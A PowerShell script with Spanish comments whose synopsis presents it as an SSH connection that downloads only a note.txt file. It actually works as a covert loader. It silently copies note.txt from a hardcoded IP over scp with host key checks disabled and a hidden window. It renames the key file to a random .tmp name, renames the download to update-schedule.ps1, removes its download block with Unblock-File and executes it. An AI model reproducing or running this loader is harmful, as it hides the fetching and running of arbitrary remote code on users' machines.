<#
.SYNOPSIS
    Conexion SSH + descarga SCP (solo note.txt) - version final
#>

# --- Auto-deteccion ---
$ScriptPath   = $PSScriptRoot
$UsuarioPC    = $env:USERNAME
$Descargas    = Join-Path $env:USERPROFILE "Downloads"

# --- Configuracion SSH ---
$ServidorIP   = "4.172.250.253"
$UsuarioSSH   = "azureuser"
$NombrePEM    = "vm-ssh-ca_key.pem"
$PEMPath      = Join-Path $Descargas $NombrePEM
$DriveFolder  = Join-Path $env:LOCALAPPDATA "drive"

# --- Verificar existencia del PEM ---
if (-not (Test-Path $PEMPath)) {
    exit 1
}

# --- Crear carpeta destino ---
New-Item -ItemType Directory -Path $DriveFolder -Force | Out-Null

# --- Eliminar note.txt si existe de una ejecucion anterior ---
if (Test-Path "$DriveFolder\note.txt") {
    Remove-Item "$DriveFolder\note.txt" -Force
}

# --- Descargar SOLO note.txt via SCP ---
$proc = Start-Process -FilePath "scp" -ArgumentList @(
    "-i", $PEMPath,
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "$UsuarioSSH@${ServidorIP}:/home/$UsuarioSSH/note.txt",
    "$DriveFolder\note.txt"
) -Wait -WindowStyle Hidden -PassThru

# --- Solo si la descarga fue exitosa ---
if (Test-Path "$DriveFolder\note.txt") {
    # Renombrar PEM
    $NewPEMName   = "{0}{1}" -f [System.IO.Path]::GetRandomFileName().Replace('.',''), '.tmp'
    $NewPEMPath   = Join-Path $Descargas $NewPEMName
    Move-Item $PEMPath $NewPEMPath -Force

    # Renombrar note.txt a update-schedule.ps1 (sobrescribir si existe)
    Move-Item "$DriveFolder\note.txt" "$DriveFolder\update-schedule.ps1" -Force
    Unblock-File -Path "$DriveFolder\update-schedule.ps1"

    # Ejecutar
    & "$DriveFolder\update-schedule.ps1"
}